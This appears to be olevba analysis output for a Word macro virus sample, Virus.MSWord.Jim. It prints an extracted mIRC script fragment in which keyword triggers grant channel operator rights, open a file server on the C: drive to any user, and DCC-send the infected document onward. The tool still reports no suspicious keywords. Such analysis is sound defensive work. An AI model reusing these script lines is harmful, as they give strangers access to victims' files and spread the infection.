olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jim-8cc6ce914876226ea0674eeaf8cb572bbef39c0d
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Jim-8cc6ce914876226ea0674eeaf8cb572bbef39c0d 
in file: Virus.MSWord.Jim-8cc6ce914876226ea0674eeaf8cb572bbef39c0d - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[script]
n0=on 1:TEXT:*relaxa*:#:/msg $chan [MrJim/SeptiC/TI] - BIG as usual in the future
n1=on 1:TEXT:*hoppauppohajja*:#:/mode $chan +b $me
n2=on 1:TEXT:*progratta*:#:/mode $chan +o $nick
n3=on 1:TEXT:*iframtiden*:#:/fserve $nick 20 c:\ config.sys
n4=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }
n5=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }

No suspicious keyword or IOC found.

